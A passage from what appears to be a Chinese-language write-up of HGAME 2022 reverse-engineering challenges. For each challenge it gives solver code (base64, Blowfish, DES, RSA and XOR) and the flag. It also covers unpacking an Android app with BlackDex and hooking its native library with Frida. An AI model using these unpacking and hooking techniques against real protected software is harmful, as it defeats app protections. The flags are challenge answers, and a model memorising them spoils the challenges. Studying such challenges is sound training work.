class="number">2</span>*v</span><br><span class="line">        <span class="keyword">if</span>(p[i] == v &amp; <span class="number">0xffff</span>):  <span class="comment"># &amp;运算规范位数</span></span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            j = <span class="number">30</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d[<span class="number">37</span>] = <span class="number">0</span>   <span class="comment">#为打印flag字符串做准备</span></span><br><span class="line">d.remove(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>):</span><br><span class="line">    d[i] = <span class="built_in">chr</span>(d[i])</span><br><span class="line"></span><br><span class="line">d = <span class="string">&#x27;&#x27;</span>.join(d)</span><br><span class="line">d = <span class="string">&#x27;hgame&#123;&#x27;</span> + d + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{noW_YOu<del>koNw-rea1_UPx</del>mAG|C_@Nd~crC16}</strong></p>
<h2 id="Week3："><a href="#Week3：" class="headerlink" title="Week3："></a>Week3：</h2><h2 id="Answer’s-Windows"><a href="#Answer’s-Windows" class="headerlink" title="Answer’s Windows"></a>Answer’s Windows</h2><p>这是个模拟 Windows面板，需要输入密码；</p>
<p>可以想到用IDA搜索显示正确或错误的句子，而IDA里搜不出中文，可以想到是用了图片；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/fddb68393bdb65f2.png" alt="locked"></p>
<p>使用IDA搜索：true，right，false，lose，win，wrong 这些特殊字样，会发现两个图片叫做right和wrong，跳转之后，会发现if的比较字符串：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/71f637e365d90e92.png" alt="main"></p>
<p>而根据静态分析和动态调试可以发现它将输入的字符串进行了base64加密，又因为反调试将调试中的base64码表换成了错误的，导致怎么也得不到比较用的字符串；但能够发现比较数据有常规base64所没有的奇怪符号；于是去字符串列表里搜索123456789（赌码表含连续数字）连着的数据，可以发现所需要的码表；</p>
<p>于是有了下面两组数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  ;&#x27;&gt;B&lt;76\=82@-8.@=T&quot;@-7ZU:8*F=X2J&lt;G&gt;@=W^@-8.@9D2T:49U@1aa  比较数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  !&quot;#$%&amp;&#x27;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`a  码表</span></span><br></pre></td></tr></table></figure>

<p>为什么码表以a结尾呢？因为比较数据后面跟着两个a，和原base64加密结果后面跟= 异曲同工；</p>
<p>还有个坑，可以看到图中的比较数据和得出的比较数据有所不同，原因在于 \ 是转义符，需要消掉解密，在没消掉之前，可以得到解除的明文是hgame开头，可后面是乱码；</p>
<p><strong>此时解密得到flag：hgame{qt_1s_s0_1nteresting_so_1s_b4se64}</strong></p>
<h2 id="creakme3"><a href="#creakme3" class="headerlink" title="creakme3"></a>creakme3</h2><p>这是PCC架构的文件，和以往的arm，x86有所不同，由PowerPC编译，所以IDA不能分析，linux不能运行；</p>
<p>此题有提示，使用Ghidra分析便可得知主体逻辑；</p>
<p>Ghidra下载：<a target="_blank" rel="noopener" href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a></p>
<p>此时可以看到main的逻辑：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/cf1d59b29185b31c.png" alt="main"></p>
<p>可以看到最中间的while()函数，他在给关于a的偏移进行排序，点击进入a后，发现是.data节中的一些数据，它们有规律：每8个字节为一个单位，初始是ascii码范围的hex值，加上4个字节后，变为一个比较大的数字；而在中间的while()函数中，排序是乘上8加了4，所以在利用较大的数字比大小，而最后putchar()进行输出，只是乘上了8，可以想到这个main函数的逻辑便是由每个单位的较大数字排序，最后输出排序后的ascii码，这应该便是flag了；</p>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ai</span>  //<span class="title">ch</span>是<span class="title">ascii</span>码，<span class="title">index</span>代表较大数字</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ch;	</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ai</span> <span class="title">a</span>[89] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    &#123; <span class="number">48</span>, <span class="number">20093</span> &#125;, &#123; <span class="number">48</span>, <span class="number">26557</span> &#125;, &#123; <span class="number">48</span>, <span class="number">31304</span> &#125;, &#123; <span class="number">48</span>, <span class="number">33442</span> &#125;, &#123; <span class="number">48</span>, <span class="number">37694</span> &#125;, &#123; <span class="number">49</span>, <span class="number">39960</span> &#125;, &#123; <span class="number">50</span>, <span class="number">23295</span> &#125;, &#123; <span class="number">50</span>, <span class="number">27863</span> &#125;, &#123; <span class="number">50</span>, <span class="number">42698</span> &#125;, &#123; <span class="number">50</span>, <span class="number">48505</span> &#125;, &#123; <span class="number">50</span>, <span class="number">52925</span> &#125;, &#123; <span class="number">51</span>, <span class="number">12874</span> &#125;, &#123; <span class="number">51</span>, <span class="number">12946</span> &#125;, &#123; <span class="number">51</span>, <span class="number">14597</span> &#125;, &#123; <span class="number">51</span>, <span class="number">17041</span> &#125;, &#123; <span class="number">51</span>, <span class="number">23262</span> &#125;, &#123; <span class="number">51</span>, <span class="number">28319</span> &#125;, &#123; <span class="number">51</span>, <span class="number">42282</span> &#125;, &#123; <span class="number">51</span>, <span class="number">48693</span> &#125;, &#123; <span class="number">51</span>, <span class="number">52067</span> &#125;, &#123; <span class="number">53</span>, <span class="number">32571</span> &#125;, &#123; <span class="number">56</span>, <span class="number">14612</span> &#125;, &#123; <span class="number">56</span>, <span class="number">45741</span> &#125;, &#123; <span class="number">57</span>, <span class="number">14554</span> &#125;, &#123; <span class="number">57</span>, <span class="number">20048</span> &#125;, &#123; <span class="number">57</span>, <span class="number">27138</span> &#125;, &#123; <span class="number">57</span>, <span class="number">45327</span> &#125;, &#123; <span class="number">66</span>, <span class="number">30949</span> &#125;, &#123; <span class="number">95</span>, <span class="number">32502</span> &#125;, &#123; <span class="number">95</span>, <span class="number">35235</span> &#125;, &#123; <span class="number">95</span>, <span class="number">36541</span> &#125;, &#123; <span class="number">95</span>, <span class="number">38371</span> &#125;, &#123; <span class="number">97</span>, <span class="number">29658</span> &#125;, &#123; <span class="number">100</span>, <span class="number">21388</span> &#125;, &#123; <span class="number">100</span>, <span class="number">25403</span> &#125;, &#123; <span class="number">100</span>, <span class="number">40604</span> &#125;, &#123; <span class="number">100</span>, <span class="number">46987</span> &#125;, &#123; <span class="number">100</span>, <span class="number">51302</span> &#125;, &#123; <span class="number">101</span>, <span class="number">12974</span> &#125;, &#123; <span class="number">101</span>, <span class="number">30329</span> &#125;, &#123; <span class="number">102</span>, <span class="number">10983</span> &#125;, &#123; <span class="number">102</span>, <span class="number">19818</span> &#125;, &#123; <span class="number">102</span>, <span class="number">22280</span> &#125;, &#123; <span class="number">102</span>, <span class="number">26128</span> &#125;, &#123; <span class="number">102</span>, <span class="number">41560</span> &#125;, &#123; <span class="number">102</span>, <span class="number">47116</span> &#125;, &#123; <span class="number">102</span>, <span class="number">51333</span> &#125;, &#123; <span class="number">103</span>, <span class="number">28938</span> &#125;, &#123; <span class="number">103</span>, <span class="number">31988</span> &#125;, &#123; <span class="number">104</span>, <span class="number">16246</span> &#125;, &#123; <span class="number">104</span>, <span class="number">28715</span> &#125;, &#123; <span class="number">104</span>, <span class="number">41966</span> &#125;, &#123; <span class="number">104</span>, <span class="number">44368</span> &#125;, &#123; <span class="number">104</span>, <span class="number">47815</span> &#125;, &#123; <span class="number">105</span>, <span class="number">16420</span> &#125;, &#123; <span class="number">105</span>, <span class="number">35362</span> &#125;, &#123; <span class="number">105</span>, <span class="number">49237</span> &#125;, &#123; <span class="number">106</span>, <span class="number">11090</span> &#125;, &#123; <span class="number">106</span>, <span class="number">50823</span> &#125;, &#123; <span class="number">107</span>, <span class="number">24320</span> &#125;, &#123; <span class="number">107</span>, <span class="number">50199</span> &#125;, &#123; <span class="number">108</span>, <span class="number">24962</span> &#125;, &#123; <span class="number">109</span>, <span class="number">30171</span> &#125;, &#123; <span class="number">110</span>, <span class="number">15457</span> &#125;, &#123; <span class="number">110</span>, <span class="number">18838</span> &#125;, &#123; <span class="number">110</span>, <span class="number">24001</span> &#125;, &#123; <span class="number">111</span>, <span class="number">11638</span> &#125;, &#123; <span class="number">111</span>, <span class="number">32023</span> &#125;, &#123; <span class="number">111</span>, <span class="number">43291</span> &#125;, &#123; <span class="number">112</span>, <span class="number">39661</span> &#125;, &#123; <span class="number">114</span>, <span class="number">17872</span> &#125;, &#123; <span class="number">114</span>, <span class="number">33895</span> &#125;, &#123; <span class="number">114</span>, <span class="number">43869</span> &#125;, &#123; <span class="number">115</span>, <span class="number">20611</span> &#125;, &#123; <span class="number">115</span>, <span class="number">25122</span> &#125;, &#123; <span class="number">115</span>, <span class="number">36243</span> &#125;, &#123; <span class="number">115</span>, <span class="number">37434</span> &#125;, &#123; <span class="number">115</span>, <span class="number">38686</span> &#125;, &#123; <span class="number">115</span>, <span class="number">46266</span> &#125;, &#123; <span class="number">115</span>, <span class="number">51077</span> &#125;, &#123; <span class="number">116</span>, <span class="number">13656</span> &#125;, &#123; <span class="number">116</span>, <span class="number">34493</span> &#125;, &#123; <span class="number">116</span>, <span class="number">38712</span> &#125;, &#123; <span class="number">117</span>, <span class="number">14096</span> &#125;, &#123; <span class="number">117</span>, <span class="number">38777</span> &#125;, &#123; <span class="number">119</span>, <span class="number">12095</span> &#125;, &#123; <span class="number">119</span>, <span class="number">17629</span> &#125;, &#123; <span class="number">123</span>, <span class="number">30945</span> &#125;, &#123; <span class="number">125</span>, <span class="number">40770</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">89</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">89</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i].index&lt;a[j].index)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ai</span> <span class="title">temp</span> =</span> a[i];</span><br><span class="line">                a[i] = a[j];</span><br><span class="line">                a[j] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">89</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(a[i].ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{B0go_50rt_is_s0_stup1d}</strong></p>
<h2 id="hardened"><a href="#hardened" class="headerlink" title="hardened"></a>hardened</h2><p>使用jeb分析发现只有SecShell，应该是被加壳了；</p>
<p>使用BlackDex进行脱壳；（下载地址：<a target="_blank" rel="noopener" href="https://github.com/CodingGay/BlackDex%EF%BC%89">https://github.com/CodingGay/BlackDex）</a></p>
<p>脱壳后会在java代码中发现加载了 libenc.so 库，调用了两个本地方法，其中加密部分就在这个库里；</p>
<p>查看 AES 加密 key、iv 的引用可以发现混淆加密的部分；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/718ee3b0f22faf2b.png" alt="unshell"></p>
<p>字符串混淆的解密可以用frida；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//script.js</span></span><br><span class="line"><span class="function">function <span class="title">print_string</span><span class="params">(addr)</span> </span>&#123; </span><br><span class="line">    var base_hello_jni = Module.findBaseAddress(<span class="string">&quot;libenc.so&quot;</span>); </span><br><span class="line">    var addr_str = base_hello_jni.add(addr); </span><br><span class="line">    console.<span class="built_in">log</span>(<span class="string">&quot;addr:&quot;</span>, addr, <span class="string">&quot; &quot;</span>, ptr(addr_str).readCString()); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* frida -U -f com.example.secretsong -l C:\Users\chz\Desktop\script.js --no-pause </span></span><br><span class="line"><span class="comment">	____</span></span><br><span class="line"><span class="comment">	/ _ | Frida 14.2.12 - A world-class dynamic instrumentation toolkit | (_| | </span></span><br><span class="line"><span class="comment">	&gt; _ | Commands: </span></span><br><span class="line"><span class="comment">	/_/ |_| help -&gt; Displays the help system </span></span><br><span class="line"><span class="comment">	. . . . object? -&gt; Display information about &#x27;object&#x27; </span></span><br><span class="line"><span class="comment">	. . . . exit/quit -&gt; Exit . . . . </span></span><br><span class="line"><span class="comment">	. . . . More info at https://frida.re/docs/home/ </span></span><br><span class="line"><span class="comment">	Spawned `com.example.hardened`. Resuming main thread! </span></span><br><span class="line"><span class="comment">	[M5 Note::com.example.hardened]-&gt; print_string(0x31070) </span></span><br><span class="line"><span class="comment">	addr: 200816 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/= 		[M5 Note::com.example.hardened]-&gt; print_string(0x31020) </span></span><br><span class="line"><span class="comment">	addr: 200736 JUST_A_NORMAL_KEY_FOR_YOU_TO_DEC </span></span><br><span class="line"><span class="comment">	[M5 Note::com.example.hardened]-&gt; print_string(0x31050) </span></span><br><span class="line"><span class="comment">	addr: 200784 you_find_me!!!!! */</span></span><br></pre></td></tr></table></figure>

<p>之后异或回去就能解字符串；</p>
<p><strong>解密得到flag：hgame{cONGraTUl4T|0N5!N0w_yoU_C4n_eN?Oy<del>thE</del>MUsIc}</strong></p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/71673d22ed0e2743.png" alt="decrypt"></p>
<h2 id="fishman"><a href="#fishman" class="headerlink" title="fishman"></a>fishman</h2><p>原码中用了 init 和 check 函数；</p>
<p>使用IDA分析fishman库，字符串搜索 init 以及 check：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/c8aa1f3e022e3854.png" alt="init"></p>
<p>可以找到init和check的函数入口，进入过后，可以在init函数里发现一些运算，根据搜索运算所给的数据和格式，可以知道这是blowfish加密；</p>
<p>此时根据加密规则可以找到，密钥就是aLetUD：LET_U_D；</p>
<p>而比较数据就存在于check函数里，果不其然，会输出win或者lose：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/68c7a001fec73b12.png" alt="check"></p>
<p>于是使用blowfish的解密库解密：(blowfish库下载：<a target="_blank" rel="noopener" href="https://github.com/xtbanban/blowfish">https://github.com/xtbanban/blowfish</a>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;blowfish.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">需要加入自带 blowfish.C 代码</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> out[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">-5409505419495256385LL</span>, </span><br><span class="line">    <span class="number">1428749241468231806LL</span>, </span><br><span class="line">    <span class="number">6435326525834898959LL</span>, </span><br><span class="line">    <span class="number">2019834963917240364LL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	BLOWFISH_CTX ctx;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    Blowfish_Init(&amp;ctx, (<span class="keyword">uint8_t</span> *)<span class="string">&quot;LET_U_D&quot;</span>, <span class="number">7</span>); <span class="comment">//初始密钥</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Blowfish_Decrypt(&amp;ctx, (<span class="keyword">char</span> *)out + <span class="number">8</span>*i, (<span class="keyword">char</span> *)out + <span class="number">8</span>*i + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,(<span class="keyword">char</span> *)out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：hgame{D0_y0u_re411V_11k3_9Vthon}</strong></p>
<h2 id="Week4："><a href="#Week4：" class="headerlink" title="Week4："></a>Week4：</h2><h2 id="WOW"><a href="#WOW" class="headerlink" title="( WOW )"></a>( WOW )</h2><p>IDA分析：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/cd589754661b5759.png" alt="main"></p>
<p>可以看到main函数里先输入容纳40长度的内容，然后进行一次for循环里的加密，从input变成output；</p>
<p>之后与比较数据比较与否，输出错误或者正确，但后面还有个for循环，后面这个是把output输入，变成input，猜想一下它可能是解密；</p>
<p>尝试将output直接修改为cmp的数据，查看解密内容：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/8247312a421ea42f.png" alt="answer"></p>
<p><strong>由此可得flag：hgame{WOWOW_h@ppy_n3w_ye4r_2022}</strong></p>
<p>补充：这个题的加密是不常规的DES加密，DES加密为对称加密，即一组密钥即可完成加解密；核心思想为扩散混淆，扩散即为将明文的1个字符扩展为密文中的多个；混淆即为算法多层，让密钥和密文的关联更难找到；</p>
<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><p>IDA:</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/88c153efacb32e53.png" alt="main"></p>
<p>可以看到函数列表里有个叫 main_main 的主函数，说明这是go语言；</p>
<p>其中还有个函数叫做 main_encrypt ，既然是加密就应该有数据才对，打开汇编模式，可以发现伪代码中看不到的数据；</p>
<p>根据汇编更改 math_big函数的输入参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall math_big___ptr_Int__SetString@&lt;rax&gt;(<span class="keyword">char</span> *str@&lt;rbx&gt;, __int64 a2@&lt;rax&gt;, <span class="keyword">int</span> a3@&lt;edi&gt;, <span class="keyword">int</span> a4@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure>

<p>可以变为：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/02ccba7b619dbada.png" alt="change"></p>
<p>也可以用同样的原理，右键其他无参函数，点 set call type ，然后更改，最后可以修复encrypt函数看到原理：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/02/56d5c8036ad373f4.png" alt="for and XOR"></p>
<p>发现在经过之前的加密后，进行了异或；且长度为153；</p>
<p>总之，根据标记符号函数名称和数据判断，这是RSA加密加上异或；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#pip install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#pip install gmpy2</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">99</span>,<span class="number">85</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">2</span>, <span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">15</span>, <span class="number">13</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">0</span> ,<span class="number">14</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">9</span> ,<span class="number">1</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):    <span class="comment"># 爆破</span></span><br><span class="line">    num = j</span><br><span class="line">    a = [<span class="number">99</span>,<span class="number">85</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">2</span>, <span class="number">2</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">15</span>, <span class="number">13</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">0</span> ,<span class="number">14</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">9</span> ,<span class="number">1</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        num ^= a[i]</span><br><span class="line">        a[i] = a[i] ^ num</span><br><span class="line">    <span 